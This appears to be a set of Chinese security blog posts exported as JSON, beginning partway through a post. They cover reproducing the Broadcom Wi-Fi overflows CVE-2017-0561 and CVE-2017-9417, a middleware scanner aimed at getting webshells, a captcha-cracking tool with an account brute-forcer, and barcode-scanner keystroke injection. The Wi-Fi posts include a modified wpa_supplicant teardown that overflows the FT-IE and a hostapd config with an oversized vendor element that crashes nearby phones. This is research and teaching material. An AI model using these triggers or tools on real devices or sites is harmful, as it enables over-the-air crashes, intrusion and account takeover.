响应帧，并提供有关设备本身的能力信息。包括所有支持速率及信道。TDLS Discovery 过程除了提供目标STA确实支援TDLS的相关能力信息外，TDLS Discovery过程的帧交互亦可以用作AP与目标TDLS STA设备的相对信号强度的测量。发起的STA能够判断与目标STA间的直接连接是否有利于提供有效信息。通过对比分別由目标STA设备与AP设备收到的信号强度，发起的STA设备可以评估建立直接连接是否会比通过AP发送数据包更为有效。• TDLS Setup过程TDLS Setup过程需要进行一系列的帧交换。发起设备首先发送一个TDLS传输请求，通过AP信道传输至目标设备。封装帧包括发送设备的性能信息。目标设备之后会回复TDLS Setup 建立响应，同样通过AP信道传送其性能信息，另外附加一个状态代码，表示接受或者拒绝该建立请求。如果接受Setup请求，发送设备将会通过AP传送一个TDLS 确认帧（Confirm Frame）。至此，两部设备之间开始进行直接通讯。• TDLS Teardown过程发送方或接受方设备均可向另外一方直接发送TDLS拆解帧（Teardown Frame），而如果未处于讯号范围內，该帧则可以通过AP信道传输。 POC 的分析过程NDK环境搭建网上有很多参考，这里就不再赘述。 编译POC在这次研究过程中，POC的编译过程花费了大量时间。主要是不了解libnl库的正确使用方法，然后找了很多资料都是安卓开发ndk的，没有怎么使用libnl库的。最后经过大量资料参考，终于找到了一种暂时可行的方法，在那篇博文中作者称目前android自身没有携带libnl库，所以如果用到libnl库就需要把libnl一起移植到安卓上。我们就根据他所描述的方法，从github上down下来了一份已经移植好的安卓平台的libnl库。具体命令如下：12345git clone https://github.com/dschuermann/libnl-3-androidcd libnl-3-android/libcd ../android_toolchaingvim jni/Android.mk(前文有该文件的相关介绍)gvim jni/Applcation.mk (前文有该文件的相关介绍) 在Android.mk的最后部分加上这一段：1include $(CLEAR_VARS) LOCAL_MODULE := pwn LOCAL_SRC_FILES := $(call list-all,$(LOCAL_PATH),pwn.c) LOCAL_SHARED_LIBRARIES := nl-3 nl-genl-3 include $(BUILD_EXECUTABLE) 修改好之后将pwn.c文件拷贝到lib文件就可以编译了。12cd ../../android_toolchainndk-build 编译好后将libs文件夹下的libnl-3.so，libnl-genl-3.so，pwn 利用adb命令将libs文件下的lib-3.so、lib-genl-3.so、pwn拷贝到已经root后的支持nl80211协议的测试机中，执行编译好的pwn就可以测试poc是否可用了。 测试POC分别在华为、小米、nexus 6p手机上进行了poc的测试。poc具体执行情况在小米手机上执行所有poc都是no such file or directory 。在华为手机上发送数据后的返回值为success。nexus手机测试结果也是success。 因为没有过wifi漏洞分析经验，不知道触发漏洞后正确的返回值应该是什么？所以接下来要透彻了解漏洞是否触发还需要大量的固件分析，漏洞定位，利用漏洞复现工作。 Wifi芯片代码分析经过一系列的各种折腾，终于开始慢慢切入正题。分析的芯片是nexus 6p 6.0 版本。 怎么找到Wi-Fi固件？要分析漏洞的成因，需要找到Wi-Fi芯片中与应用层通信部分代码。那接下来要怎么做才能将手机中的固件代码导出来呢？第一步：我们需要了解Wi-Fi芯片在安卓系统内存中的加载位置。关于这个问题我们参考了Project Zero 的博客中分析的有关Wi-Fi芯片架构的知识，在Broadcom Wi-Fi芯片组相关的数据手册中，ARM内核具有用于保存固件代码的640KB ROM，以及用于数据处理（例如堆）和存储固件代码补丁的768KB RAM。 RAM的位置可以通过读取主机驱动程序中的初始化代码，找到包含RAM内容的文件是上图所示fw_bcmdhd.bin文件（实际上，通过驱动程序的代码，我们找到了BCMDHD_FW_PATH配置，其用于表示驱动程序将内容上传到RAM的文件的位置。） ROM转存则可以通过Broadcom提供的一个非常强大的命令行实用程序dhdutil，可用于通过bcmdhd驱动程序与芯片进行交互。命令： ./dhdutil -i wlan0 membytes r 0x0 0xA0000 &gt; /sdcard/rom.bin 什么时候产生漏洞？ 利用上述方法转存出来bin文件之后，我们首先要了解bug产生的原因，才能下一步更好的定位漏洞位置。根据Project Zero提供的技巧，Wi-Fi管理帧以小的“标记”数据块（称为信息元素（IE））对大多数信息进行编码，传输的大部分信息也是利用IE进行编码的，所以这应该是我们逆向分析的一个好的出发点，有数据交互才可能出现漏洞。分析了漏洞利用可行性之后确定了在进行TDLS连接过程中会触发漏洞。有关TDLS前文中有描述。 定位固件中漏洞位置根据Project Zero的提示在brcmsmac驱动程序可以找到Broadcom是使用一个函数从bcm_parse_tlvs帧提取IE。那接下来我们需要做的就是定位这个函数。搜索附近字符串提示我们首先定位到了bcm_parse_tlvs函数位置。然后通过交叉参考分析最终找到漏洞函数，要探索该漏洞的成因，首先要知道TDLS建立确认帧的函数处理流程。这个函数首先会执行一些验证，以确保请求是合法的。其查询内部数据结构，以确保确实正在与请求对等体建立TDLS连接。然后，其验证Link-ID IE（通过检查其编码的BSSID与当前网络的匹配），并且还验证32字节的发起者随机数（“Snonce”）值（通过将其与存储的初始随机数进行比较）。 建立对请求可能确实是合法的一定程度的置信度后，该函数开始调用一个内部帮助函数，任务是计算MIC并确保其与编码在帧中的一致。固件还包括该函数的名称(“wlc_tdls_cal_mic_chk”)。我们先看MIC通过编码在握手帧中的计算。 我们对固件逆向后也定位到了这个函数，如下图所示，反编译后伪代码中提示信息可以看到在标记的第二段代码进行了IE长度的校验，后续的IE就没有校验了。因此，将RSN-IE的长度设置为较大的值将导致Timeout Interval和Fast Transition IE越界复制，从而溢出缓冲区。 接下来看断开连接时mic计算。 伪代码中的在断开帧时没有对FT-IE进行溢出校验，如果构造好FT-IE数据就能触发溢出。 漏洞触发场景复现知道了漏洞是怎么产生的，接下来就是测试漏洞是否按照我们预期的那样能够触发。首先，准备了同时支持TDLS 协议的TL-WN722N无线网卡，跟nexus 6p。第二步，为了测试漏洞，需要修改wpa_supplicant，以使我们能发送包含过大FTIE的TDLS断开帧。查看wpa_supplicant的代码可快速识别负责生成和发送断开帧的函数wpa_tdls_send_teardown。通过对该函数添加一些小的更改（绿色），我们应该能够在收到断开帧时触发溢出，导致超写25个字节的0xAB，修改后make编译一下。1234567891011121314static int wpa_tdls_send_teardown(struct wpa_sm *sm, const u8 *addr, u16 reason_code)&#123;...ftie = (struct wpa_tdls_ftie *) pos;ftie-&gt;ie_type = WLAN_EID_FAST_BSS_TRANSITION;ftie-&gt;ie_len = 255;os_memset(pos + 2, 0x00, ftie-&gt;ie_len);os_memset(pos + ftie-&gt;ie_len + 2 - 0x19, 0xAB, 0x19); //Overflowing with 0xABos_memcpy(ftie-&gt;Anonce, peer-&gt;rnonce, WPA_NONCE_LEN);os_memcpy(ftie-&gt;Snonce, peer-&gt;inonce, WPA_NONCE_LEN);pos += ftie-&gt;ie_len + 2;...&#125; 第三步，执行TDLS命令去触发。这种情况是可以触发漏洞的，但是呢并没有明显现象的原因是Broadcom堆实现背后的逻辑。深入分析分配算符的逻辑，我们发现其非常简单，其是一个简单的“最适合”分配算符，其执行向前和向后合并，并保持一个空闲块单链表。当分配块时，从最适合空闲块（足够大的最小块）的末端（最高地址）对其进行切取。在断开连接后，空闲列表中的其中一个块的大小突然异常大。回想一下，由于分配算符使用“最适合”，这意味着只要存在其他足够大的空闲块，后续分配将不会被放置在此块中。这也意味着固件不会崩溃，实际上会继续正常运行。如果我们不可视化堆的状态，我们就根本无法确定发生了什么事。123TDLS_DISCOVER – 发送“TDLS发现请求”帧并列出响应TDLS_SETUP - 建立与具有给定MAC地址的对等体的TDLS连接TDLS_TEARDOWN - 断开与具有给定MAC地址的对等体的TDLS连接 总结最近两周的分析过程中，确实遇到了很多问题，比如最开始编译poc的过程中对libnl库不会用，花了很长时间，最终的可行方法也不知道是不是最适合的。poc代码中使用了内核通信netlink协议，之前并没有接触过，这次也只是花了两天时间粗略看了poc中用到的函数。有关netlink相关知识后续还要深入学习。接下来编译测试poc之后，poc测试返回success但是并没有明显的触发漏洞现象。基于此，参考了Project Zero的博客复现了CVE-2017-0561漏洞，整个过程从Wi-Fi芯片固件的知识开始了解，到怎么定位漏洞位置，怎么找到漏洞，怎么利用漏洞触发漏洞。这个过程也学到了很多知识。比如，Wi-Fi帧格式、TDLS协议、Broadcom堆实现、支持TDLS协议的wpa_supplicant开源工具等这些的理解。接下来要想利用漏洞就需要深入的去理解Wi-Fi的通信过程，netlink协议，以及动态的分析过程。 参考链接1、 http://bobao.360.cn/learning/detail/3742.html2、 https://googleprojectzero.blogspot.jp/2017/04/over-air-exploiting-broadcoms-wi-fi_4.html","tags":[{"name":"Poc","slug":"Poc","permalink":"http://www.future-sec.com/tags/Poc/"},{"name":"BROADCOM WI-FI","slug":"BROADCOM-WI-FI","permalink":"http://www.future-sec.com/tags/BROADCOM-WI-FI/"}],"categories":[{"name":"BROADCOM WI-FI","slug":"BROADCOM-WI-FI","permalink":"http://www.future-sec.com/categories/BROADCOM-WI-FI/"}]},{"title":"BROADCOM WI-FI芯片漏洞分析二","date":"2017-08-29T16:00:00.000Z","path":"broadcom-wifi-2.html","text":"前言上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。1、首先是定位到帧提取函数2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的bcm_parse_tlvs函数。上篇文章已经给出了具体伪代码示例。这里就不再赘述。3、定位到函数之后我们可以根据Project Zero 提供的高级逻辑在ida中定位到相关位置。12345678910111213141516171819uint8_t* buffer = malloc(256);uint8_t* pos = buffer;//Copying the initial (static) informationuint8_t* linkid_ie = bcm_parse_tlvs(..., 101);memcpy(pos, linkid_ie + 0x8, 0x6); pos += 0x6; //Initiator MACmemcpy(pos, linkid_ie + 0xE, 0x6); pos += 0x6; //Responder MAC*pos = transaction_seq; pos++; //TransactionSeqmemcpy(pos, linkid_ie, 0x14); pos += 0x14; //LinkID-IE//Copying the RSN IEuint8_t* rsn_ie = bcm_parse_tlvs(..., 48);if (rsn_ie[1] + 2 + (pos - buffer) &gt; 0xFF) &#123; ... //Handle overflow&#125;memcpy(pos, rsn_ie, rsn_ie[1] + 2); pos += rsn_ie[1] + 2; //RSN-IE//Copying the remaining IEsuint8_t* timeout_ie = bcm_parse_tlvs(..., 56);uint8_t* ft_ie = bcm_parse_tlvs(..., 55);memcpy(pos, timeout_ie, 0x7); pos += 0x7; //Timeout Interval IEmemcpy(pos, ft_ie, 0x54); pos += 0x54; //Fast-Transition IE 到这里就不再继续解释了。如果还有地方不清楚可以提出疑问。 切入主题1、本篇文章主要核心是侧重CVE-2017-9417的漏洞分析和利用。2、涉及到的相关知识将以链接形式详细给出 CVE-2017-9417漏洞分析分析ROM固件找到漏洞1、一种方式是七月分打过补丁的Rom固件跟六月份没打补丁的利用 BinDiff （安装到IDA目录下在IDA中以插件形式执行，Crtl+6使用）对比，看修改了哪个补丁。最后可以找到漏洞函数wlc_bss_parse_wme_ie。这个函数用来处理关联、重新关联和信标包。这些信标包包含信息元素，包含Wi-Fi标准扩展的数据。每个信息元素（IE）的格式是：type (1 byte), length (1 byte), data of (length) bytes2、这个函数功能用来处理服务质量扩展的WME信息元素。下图是WME信息元素的格式：3、定位漏洞函数· bindiff对比6月份补丁跟7月份补丁的差异· 第一步：将两个补丁版本都dump下来。· 第二步：安装bindiff 到 ida 目录。安装方式，这里提供windows下安装包bindiff· 第三步：先用ida打开7月份补丁，分析固件补丁时要注意它在内存中的存储位置，在上篇文章中我们提到ram在安卓系统内存中加载起始地址在0x180000.所以我们需要在ida加载时手动设置加载起始位置。并将分析好的数据保存数据库idb文件来方便我们跟6月份版本做对比。具体配置如下：· 第四步：同样方式打开6月份补丁文件，Crtl+6启动bindiff插件，选择我们上一步保存的idb文件，可以对比分析两个版本有什么不同。 跟踪到造成漏洞的函数。 漏洞成因·该函数在关联/重新关联响应帧部分出现bug，它将接收到的ie复制到24（0x18）字节长的预分配缓冲区，大小适合最大的有效WME信息元素长度，但是使用信息元素头的长度可以高达255（0xff），创建一个堆在外边界写入231个字节，可造成溢出。 分析wlc_bss_parse_wme_ie漏洞函数。assocresp_ies数据分析数据包信息大致理解关联帧IE的0x0c头部信息暂时理解为特定供应商标签。如下图比较可以看到修补bug前，没有对wme大小进行校验直接拷贝到预分配的缓冲区。缓冲区分配ida中参考在这里 触发漏洞这个bug很容易复现，因为最新版的Hostapd 支持自定义信息元素。hostapd 安装：链接 下载hostapd到ubuntu 14.04 解压hostapd 配置hostapd，使它编译为支持nl80211驱动cp defconfig .configvi .config #找到“#CONFIG_DRIVER_NL80211=y”，去掉“#”符号。保存。 make #编译hostapd ，编译过程会报错，是因为缺少libnl库解决方法：下载并编译安装libnl 可以到主页下载：http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：12345git clone git://github.com/tgraf/libnl-1.1-stable.gitcd libnl-1.1-stable./configuremakesudo make install 5、make编译在启动hostapd时指定配置文件1、新建配置文件 在/etc/目录新建一个文件hostapd.conf2、配置文件内容1234567891011121314# WiFi Hotspotinterface=wlan0driver=nl80211#Access Pointssid=YourNetworkNameHerehw_mode=g# WiFi Channel:channel=1macaddr_acl=0auth_algs=1ignore_broadcast_ssid=0assocresp_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141vendor_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141 1.interface：接入点设备名称，注意不要包含ap后缀，即如果该设备称为wlan0ap，填写wlan0即可；2.driver：设定无线驱动，我这里是nl80211；3.ssid: 设置名字(SSID = service set identifier) ,老版本(iwconfig)叫”essid”.4.hw_mode: 设置操作mode,channels.有效的值取决于硬件,通常:a, b, g. ‘g’大多数都支持, 并向前兼容802.11b5.channel:设置hostapd操作的channel.6.ignore_broadcast_ssid: 开启或禁用广播ssid.7.macaddr_acl: MAC地址过滤. .8.auth_algs: 指定采用哪种认证算法，采用位域（bit fields）方式来制定，其中第一位表示开放系统认证（Open System Authentication, OSA），第二位表示共享密钥认证（Shared Key Authentication, SKA）。我这里设置alth_algs的值为1，表示只采用OSA；如果为3则两种认证方式都支持。 9.assocresp_elements:关联响应帧的附加供应商特定信息（翻译过来中文参考，不确定是否正确） 10.vendor_elements：信标和探测响应帧的附加供应商特定元素（翻译过来中文参考，不确定是否正确）3、启动 hostpad1.启动1sudo ./hostapd -B /etc/hostapd.conf 2.启动过程如果出现“Interface wlan0 wasn’t started”错误，先运行下面2行命令12sudo nmcli nm wifi offsudo rfkill unblock wlan 然后继续执行1sudo ./hostapd -B /etc/hostapd.conf 3.目标手机连上指定开启的wifi名称为“YourNetworkNameHere”的wifi，即可看到漏洞被触发，wifi重启。 漏洞利用前面已经了解了漏洞的成因，和简单复现了漏洞。接下来我们要做的是利用漏洞做些事情。后续继续分析将详细给出exploit的编写方法。 参考链接1、Ubuntu上编译hostapd：http://blog.csdn.net/hnllc2012/article/details/491511372、博客参考：http://boosterok.com/blog/broadpwn1/","tags":[{"name":"Poc","slug":"Poc","permalink":"http://www.future-sec.com/tags/Poc/"},{"name":"BROADCOM WI-FI","slug":"BROADCOM-WI-FI","permalink":"http://www.future-sec.com/tags/BROADCOM-WI-FI/"}],"categories":[{"name":"BROADCOM WI-FI","slug":"BROADCOM-WI-FI","permalink":"http://www.future-sec.com/categories/BROADCOM-WI-FI/"}]},{"title":"中间件漏洞检测框架(F-MiddlewareScan)","date":"2016-03-16T16:00:00.000Z","path":"f-middlewarescan.html","text":"Setup实现针对中间件的自动化检测，端口探测-&gt;中间件识别-&gt;漏洞检测-&gt;获取webshell参数说明-h 必须输入的参数，支持ip(192.168.1.1)，ip段（192.168.1），ip范围指定（192.168.1.1-192.168.1.254），最多限制一次可扫描65535个IP。-p 指定要扫描端口列表，多个端口使用,隔开 例如：7001,8080,9999。未指定即使用内置默认端口进行扫描(80,4848,7001,7002,8000,8001,8080,8081,8888,9999,9043,9080)-m 指定线程数量 默认100线程-t 指定HTTP请求超时时间，默认为10秒，端口扫描超时为值的1/2。例子： 123python F-MiddlewareScan.py -h 10.111.1python F-MiddlewareScan.py -h 192.168.1.1-192.168.2.111python F-MiddlewareScan.py -h 10.111.1.22 -p 80,7001,8080 -m 200 -t 6 效果图： 漏洞检测脚本以插件形式存在，可以自定义添加修改漏洞插件，存放于plugins目录，插件标准非常简单，只需对传入的IP，端口，超时进行操作，成功返回“YES|要打印出来的信息”即可。新增插件需要在 plugin_config.ini配置文件中新增关联（多个漏洞插件以逗号隔开）。中间件识别在discern_config.ini文件中配置（支持文件内容和header识别） 目前内置了19个漏洞插件，希望大家可以一起编写更多的插件，目前还缺少weblogic自动部署和反序列化探测以及中间件的反序列化自动获取webshell的插件等等。 下载地址：http://down.future-sec.com/F-MiddlewareScan.rar","tags":[{"name":"python","slug":"python","permalink":"http://www.future-sec.com/tags/python/"},{"name":"自动化检测","slug":"自动化检测","permalink":"http://www.future-sec.com/tags/自动化检测/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/categories/web安全/"}]},{"title":"简单验证码识别及工具编写思路","date":"2016-03-06T16:00:00.000Z","path":"verification_code.html","text":"注：此文章只适合简单验证码，最后也将编写的工具附上以及关键部分代码和使用说明文档。 简介虽然验证码发展到如今有许多人类都难以识别的状态了，但人有部分老系统使用的验证码异常的简单。还有一些网站由于程序员本身的素质或者缺乏相关图像相关的知识，所以并没有自己写验证码的生成程序，而是直接在网上随便复制粘贴一个Demo级别的代码来用，以达到网站有验证码的目的，而忽略了验证码的强弱性，导致很多网站的验证码都是爆款弱验证码。如： 还有更糟糕的比如： 直接就能复制的…这种是完全不知道验证码的意义或者为了应付而做的验证码 处理方式好吧忽略上面的图继续说。 对于那些简单验证码他们的共同点是： 标准字体 背景单简单甚至纯色没有背景 字体并没有粘贴在一起而本文讨论的就是这类的验证码。对于那种连背景都没有的纯色、标准字体、没有黏贴的那种再简单不过了，直接就是100%的识别率。 这种就不讨论了，下面来看看wooyun的验证码。 Wooyun的验证码有两种状态： 一种是白色文字深色背景，一种是黑色文字浅色背景。如果只有一种，无论是那种设定一个阀值都能很好的二值化，但现在的情况却是有两种，所以我能想到的最简单的方式，那好，我就给出两个阀值，对于黑色文字我就用一个较小一点的阀值，对于白色文字我就用一个较大一点的阀值。但是这样还是会出现一个问题，白色文字二值化后背景黑色文字白色 ，而黑色文字二值化后背景白色文字黑色，就像下面一样： 可以看出上面我左边框选区域一切正常，而右边却出了问题，那是因为在我写程序的时候，我认为二值化后文字都是黑色背景是白色，所以我就把黑色区域当作文字来框选，就看到了如上的效果。所以说这是一个问题，不仅要二值化，二值化后还要到底白色是文字还是黑色是文字。 于是我又想到一种办法，通常情况下一张图上背景的面积都会大于文字所占用的面积，所以在二值化的同时我还做了一件事情，二值化的同时记录下黑点个数和白点个数，如果黑点的个数大于了白点的个数，那么我就把黑白反色一下，让黑色像素点变成最少，这样再把黑色像素当作文字处理。 这样做还有一个问题就是，我应该怎么知道什么时候应该使用那一个阀值来二值化，当然办法可以有很多，比如当图像上深色像素多余浅色像素的时候，使用较大阀值，否则相反，不过我并不是这样做的。 在工具上我提供了一个框，让用户输入验证码的字符个数，这样的话我对体统的阀值挨个遍历，二值化后去识别区域，如果框出来的区域个数是有问题的，那么就换下一个阀值，如果所有阀值都遍历完了还是有问题 ，那么这验证码确实也是超出这个工具的范围了，因为这个工具的目的是通用，对于那些需要单独写代码来识别的不在他的能力范围内。 在这之前一些验证码可能还需要一些处理，比如很常见的一些验证码有边框的。 左边是没有裁剪的边框，一起被二值化成为了黑色，然后拆字就悲剧了，右边是裁剪掉了一个像素的把边框去掉了，然后就一切正常了，这种情况就不说了，都懂的。 还有一种比较复杂的情况，因为二值化并不是万能的，并不是说什么验证码一进行二值化后，文字和背景就出来了，下面这张图是我以前程序需要做的百度推广的验证码识别。 上面这张图不怎么能看到效果，因为都是好几年前的事情了，验证码连接访问已经是500了，这张图都是测试的时候的截图。 我描述一下情况吧，上面的验证码，首先有边框、文字、干扰线，即使能把边框裁剪掉，也找不到一个合适的阀值来把线条和文字分离，很简单因为他的线条的颜色比文字的颜色深，如果我的阀值太小，那么我的文字就没有了，只会剩下一些线条在那里。 这图为上面那张图片上验证码的NZ两个字符，在ps中放大的效果(尽管上面图像原来并非保存的png格式已经失真，但大概还是能看到点什么的) 我也去翻了翻以前的代码来看，当初我二值化的时候，并非直接二值化的，在二值化之前还单独对RGB进行了判断，代码截图如下： 百度推广的验证码是我做的第一个验证码识别程序，所以我一直记得很清楚，不是一个二值化就能搞定的，所以说在这个工具中我也加入了同样可以单独处理RGB的功能。 由于百度的这个验证码已经访问不了了，所以我找了一个同样有线条的验证码，但是这个验证码线条颜色比文字颜色浅，所以我就用默认的127作为阀值，假设二值化无法搞定。 用127阀值上面线条一起被黑化了，但是图片中文字颜色接近黑色，而线条颜色却要浅一点，所以判断的时候，可以认为RGB的平均值大于20的就视为背景，就可以这样干。 然后效果就成了这样： 这样线条就被处理掉了，不过这个验证码直接设置阀值就能搞定，只是为了说明，所以采用127作为阀值。还有一点这个验证码和百度的那个他们线条，都是在文字的下方，如果是在文字上方，那么同样的超出了这个工具的范围 ，对于线条在上方的，我想过一些处理方式，假设线条为红色的时候，我在遍历的时候遇到一个红色像素点，我就把红色像素设置为和他相邻像素的非红色的颜色，但是我想了一想这个“相邻”，就涉及了它周围八个像素点，我应该取那一个像素点的颜色。 如果是在背景上还好，他周围应该都是背景的颜色，那一个都无所谓，可是如果是在线条，背景还有文字的交界处就不好处理了，所以工具里面暂时还没提供这样的功能，还有那种很难分离背景或者字黏贴在一起的，但是每个文字都是一个颜色的那种，也想过一些处理方式，但是实现起来我感觉都会存在一些小问题，所以就还展示没有做，就不扯那么多了，等做好了再来扯，才比较有证据。 拆字和识别下面来说说验证码识别中的一个难点 -&gt; 拆字。 基本上在我看来，能正确的拆字，那么就已经成功了80%了，因为剩下的就是比对的问题了，我在工具中只提供了两种方式拆字。 手动添加就不用说了，我这里的自动识别是最传统的深度遍历，从图像的第一个像素点开始遍历，因为图像已经二值化，按照我的工具的理解 ，就只剩下白色背景和黑色文字，所以遇到一个黑色像素点的时候开始记录，然后开始深度遍历，大概效果如下： 大概代码如下： 对于拆字还有很多其他的方式，这里只是最普通的也是最简单的一种，对于其他方式这个工具中并没有提供，因为工具只针对简单通用的验证码，对于那种需要单独写代码的验证码不考虑，而且工具上功能附加太多也就变得复杂了，其实重点就是感觉有点付出和回报不成正比，而且对于那些流传的拆字理论知识，说起来确实简单，但是实际做的时候才会发现，这些理论其实是存在漏洞的，只会在特定条件下才会成立，而验证码却是变幻多端的，这里也就不扯那么多了。 剩下来的就是识别了，我采用的识别方式比较简单，就是两张图来对比，一张是验证码上面截取出来的图像，一张是已知的样本图像。 调用函数会返回这两张图的重叠的像素的个数，这样我把截取出来的验证码字符和我所有的样本对比一次，取出nCount最高的一个作为结果，也就是说取出和样本中重叠率最高的一个出来作为结果，在工具中我有两种方式提供样本，一种是使用系统的字体，一种是手动采集。 如果使用系统字体，在文本框内输入验证码可能出现的字符，然后点击生成，会弹出系统对话框设置字体，从而产生样本，不过对于一些非标准字体，系统字体就很难搞定了，无论是标准字体，还是非标准的字体都建议使用手动采集的方式，因为直接从验证码上截取下来的图怎么说也是原配，重复的图片工具也只会采集一次，不会重复添加降低效率比对，下面就是一个非标准字体。 理论上来说，样本采集越多越全，识别率就越高，反正我每次都是使用的手动采集样本，对了这个工具只是一个配置工具而已，并不能用来做什么其他事情，当一切都配置好了之后，就可以点击工具上的 文件 -&gt; 保存，将这些所有的配置保存成一个文件，可以保存为两种后最(.ci和.ci.png) ，后者以图片保存方便电脑上查看。 而识别是另一个独立的工具调用，如果是.NET，则直接调用提供的dll来识别，之所以这样设计是因为，我并不知道别人，会用验证码识别来做什么事情，所以除了识别以外，我也不知道别人想要什么功能，所以把所有东西全部独立出来，供别人调用或者使用，对于识别我提供了一个命令行调用工具供给非.NET平台的程序调用。 以python举例： 12345678# coding: UTF-8 import os result = os.popen('verifytool.exe D:\\\\woo.ci.png -f D:\\\\woo-verify.png').readlines() print (result) # coding: UTF-8 import os result = os.popen('verifytool.exe D:\\\\woo.ci.png -f D:\\\\woo-verify.png').readlines() print (result) 在我的D盘有这样一张图： 这样别人就可以自己写脚本去做自己爱做的事情，不过我还是建议使用-p的方式来调用。123456789# coding: UTF-8 import urllib2 from socket import * h = urllib2.urlopen('http://www.wooyun.org/captcha.php') str = h.read() #获取验证码 s = socket(AF_INET,SOCK_DGRAM); s.sendto(str,('localhost',14250)) #将获取到的验证码发送给识别程序 code = s.recvfrom(65500) #接受识别出来的验证码 print(code) 如果程序是.NET平台编写，则可直接使用VerifyReader.dll文件，将其添加引用然后： 123CodeInfo ci = CodeInfo.LoadFromFile('D:\\\\woo.ci.png');CodeHelper helper = new CodeHelper(ci);string code = helper.GetCodeString(Image.FromFile('D:\\\\woo-verify.png'));此处输入代码 另外这里还单独的做了一个账户爆破的工具出来： 以下是用自己测试的结果： 双击列表即可查看数据 相关链接全套工具及核心代码和使用说明下载连接：http://down.future-sec.com/VerifyReader-1.1.zip","tags":[{"name":"python","slug":"python","permalink":"http://www.future-sec.com/tags/python/"},{"name":"验证码","slug":"验证码","permalink":"http://www.future-sec.com/tags/验证码/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/categories/web安全/"}]},{"title":"一维条形码攻击技术(Badbarcode)","date":"2016-02-24T16:00:00.000Z","path":"badbarcode.html","text":"前言在日常生活中，条形码随处可见，特别在超市，便利店，物流业，但你们扫的条形码真的安全吗？之前TK教主在PacSec介绍的条形码攻击和twitter上的demo视频太炫酷，所以就自己买了个扫码器自己研究了一下 ，在研究时候也找遍了国内外所有资料，但是都没有对可以执行的攻击技术完整的文章，故有此文分享。 条形码介绍条形码(barcode)是将宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符。常见的条形码是由反射率相差很大的黑条（简称条）和白条（简称空）排成的平行线图案。常见的条形码类型有code39 code128 code93 EAN128 EAN13QR等，前面大部分是一维条形码，而QR则是二维条形码，本文重点针对支持一维条形码的扫码器。其中code128是使用最广泛，支持字符最多的一种类型，一般都利用code128条形码进行攻击。 扫码器介绍扫码器，大家几乎每天都能看到，在超市付账，物流，医院，彩票等。作用就是把条形码的信息提取出来，而常规的扫码器的工作原理是利用红外线照射，然后反射得出条形码的信息，再用扫描器内置的芯片处理得出结果。国际上常用的扫描器品牌有Symbol，Honeywell，Datalogic等，其中symbol已被摩托罗拉收购。大家在超市购物付账时候都注意到，商品通过扫描后，商品的编码直接显示在屏幕上，其实很多扫码器都是用keyboard的方式输入的，也就是说一个扫描器就相当于一个键盘，这是一个较大的风险。 Code128条形码既然知道扫描器是一个keyboard设备，只要控制条形码的数据就可以随意输入键盘数据了。但例如UPC条形码只支持数字，有些则只支持数字与字母，而Code128 是一种广泛使用的条形码类型，因为它支持ASCII0-127字符，所以叫code128，条形码长度可调，最大支持232个字符。Code128也分为三种： Code128A：标准数字和大写字母，控制符，特殊字符 Code128B：标准数字和大写字母，小写字母，特殊字符 Code128C/EAN128：[00]-[99]的数字对集合，共100个，即只能表示偶数位长度的数字。Code128由四部分组成:起始码，数据码，校验码(可有可无)，结束码 如上条形码，黑白相间，且线条粗细不一；由黑色线条(条，Bar)与空白(空，Space)组成，根据粗细程度，可以将以上条形码起始码解读为:211214；第一条黑色竖线是由两个单位的竖线合并组成，而第二条空白竖线即由一个单位的竖线，如此类推。一般前6条的Bar与Space为一个单元。211214 用1,0转成逻辑码就是11010010000，也即是起始码。起始码对照：128A 11010000100128B 11010010000128C 11010011100 结束码都是统一的1100011101011根据上面的解读出的逻辑码11010010000，就可以推断上面那个条形码是属于code128-B类型了。 最后再根据code128的编码表就可以分析出条形码的数据（编码表太长就不贴完了）0x04 控制字符与条形码生成根据上面分析的code128规则，已经可以自己写出一个读取识别和生成条形码的程序了。而我们是要执行操作，最简单的就是利用控制字符。控制字符即非显示字符，例如回车，换行，制表符等。在ASCII中，0-31和127 就是控制字符。根据ASCII的控制字符表，可以看出Ctrl+?的组合键几乎都有了，例如Ctrl+O，也就是打开文件，但这个只是局部快捷组合键，在一些程序中才能应用，例如浏览器，word等等，利用这些控制字符在某些终端可以使程序跳出沙盒。如何生成可以使计算机执行Ctrl+O的条形码？因为已经上面已经介绍过code128的规则算法，自己写程序也可以。网络也有很多条形码生成的小程序，但在这里推荐一个强大的条形码编辑工具：BarTender 下载安装后点击菜单栏“文件”-“新建”-“完成”，就会出现一个空白模板。 然后点击条形码按钮就可以创建自己的条形码，选择code128类型。 利用BarTender轻松就可以生成出条形码，而且字符可以随时改动，方便调试。扫描上图就验证码后，会输入“FutureSec”，然后输入控制字符Ctrl+O 扫码器扫描后立即弹出对话框市面上基本任何一款扫码器都能执行，因为code128是绝大部分扫码器都支持的。0x05 Advanced Data Formatting（高级数据格式）Advanced Data Formatting（ADF），高级数据格式。是摩托罗拉针对扫描器开发的一种更高级的数据输入，根据自己的设定一步一步的规则可以自定义输入的数据，也可以说是一种支持编程的条形码技术。例如，在一个结账系统中，当你对一个商品扫描后，由于该结账系统不能直接对该条形码直接处理，就需要这种技术。结账系统识别码：A12345，前面要A开头；条形码的数据类型：12345 